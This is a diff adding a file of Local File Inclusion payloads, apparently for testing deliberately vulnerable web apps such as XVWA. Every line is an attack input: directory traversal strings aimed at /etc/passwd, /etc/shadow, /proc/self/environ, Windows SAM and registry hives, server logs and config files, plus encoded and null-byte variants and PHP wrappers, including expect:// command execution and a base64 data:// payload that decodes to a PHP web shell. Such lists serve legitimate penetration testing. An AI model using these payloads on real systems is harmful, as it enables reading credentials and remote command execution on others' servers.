@@ -1,0 +1,76 @@
+# LFI payloads for testing Local File Inclusion vulnerabilities
+# Linux LFI payloads - HIGH PRIORITY (most likely to work)
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../etc/passwd
+/etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+/etc/shadow
+/etc/hosts
+/proc/version
+/proc/self/environ
+../../../var/log/apache2/access.log
+
+# Windows LFI payloads
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+C:\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\windows\\win.ini
+C:\\windows\\win.ini
+..\\..\\..\\windows\\system.ini
+C:\\boot.ini
+..\\..\\..\\windows\\system32\\config\\sam
+C:\\windows\\system32\\config\\system
+
+# Mixed slashes
+../../../windows/system32/drivers/etc/hosts
+../../../windows/win.ini
+../../../windows/system.ini
+../../../boot.ini
+
+# Encoded traversal
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%2e%2e/%2e%2e/%2e%2e/windows/win.ini
+
+# Other Windows files
+..\\..\\..\\windows\\system32\\config\\sam
+..\\..\\..\\windows\\system32\\config\\system
+..\\..\\..\\windows\\system32\\config\\software
+..\\..\\..\\windows\\repair\\sam
+..\\..\\..\\windows\\repair\\system
+
+# IIS logs
+..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log
+..\\..\\..\\windows\\system32\\logfiles\\w3svc1\\ex*.log
+
+# Application files
+..\\..\\..\\program files\\apache group\\apache\\conf\\httpd.conf
+..\\..\\..\\program files\\apache group\\apache\\logs\\access.log
+..\\..\\..\\program files\\apache group\\apache\\logs\\error.log
+
+# Deep traversal (for stubborn apps)
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../windows/win.ini
+../../../../../../../../../../../../../windows/win.ini
+
+# PHP wrappers (for XVWA-like apps)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+expect://id
+expect://ls
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+# Null byte injection
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../windows/win.ini%00.txt
+
+# Extra payloads for XVWA
+/var/www/html/index.php
+/var/www/html/config.php
+../../config.php
+../../includes/config.php
